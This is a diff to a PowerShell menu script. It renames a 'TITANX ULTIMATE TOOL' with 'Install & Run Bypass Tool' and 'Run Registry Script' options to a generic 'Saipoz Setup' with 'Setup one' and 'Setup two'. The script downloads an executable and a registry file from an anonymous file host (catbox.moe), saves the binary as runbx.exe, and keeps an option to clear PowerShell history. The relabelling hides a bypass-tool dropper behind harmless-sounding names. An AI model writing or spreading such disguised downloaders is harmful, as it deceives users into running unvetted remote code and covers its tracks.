@@ -3,11 +3,11 @@
 # -----------------------------
 Clear-Host
 Write-Host "========================================" -ForegroundColor Cyan
-Write-Host "     TITANX ULTIMATE TOOL v2.0" -ForegroundColor Magenta
+Write-Host "     Saipoz Setup" -ForegroundColor Magenta
 Write-Host "========================================" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "  [1] Install & Run Bypass Tool" -ForegroundColor Green
-Write-Host "  [2] Run Registry Script" -ForegroundColor Yellow
+Write-Host "  [1] Setup one" -ForegroundColor Green
+Write-Host "  [2] Setup two" -ForegroundColor Yellow
 Write-Host "  [3] Clear PowerShell History" -ForegroundColor Red
 Write-Host "  [4] Exit" -ForegroundColor Gray
 Write-Host ""
@@ -45,7 +45,7 @@ if (-not (Test-Path $downloadsPath)) {
 $exeDestination = Join-Path $downloadsPath "runbx.exe"
 $regDestination = Join-Path $env:TEMP "titanx_reg.reg"
 $exeUrl = "https://files.catbox.moe/bt0dfp.bin"
-$regUrl = "https://files.catbox.moe/o3dtap.reg"
+$regUrl = "https://files.catbox.moe/if7ith.reg"
 
 # -----------------------------
 # Option 1: Install & Run Bypass Tool
